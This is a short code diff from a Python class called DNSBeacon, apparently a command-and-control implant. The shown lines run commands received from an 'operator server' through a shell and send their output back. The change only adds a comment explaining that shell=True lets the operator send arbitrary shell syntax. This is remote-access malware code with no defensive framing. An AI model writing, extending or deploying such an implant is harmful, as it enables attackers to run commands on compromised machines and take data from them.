@@ -174,6 +174,8 @@ class DNSBeacon:
                     print(f"Executing: {command}")
                     proc = subprocess.run(
                         command, shell=True, capture_output=True, text=True, timeout=60,
+                        # shell=True required: C2 commands may contain pipes, redirects,
+                        # and arbitrary shell syntax received from the operator server.
                     )
                     output = proc.stdout + proc.stderr
                     self.send_result(command, output, proc.returncode)
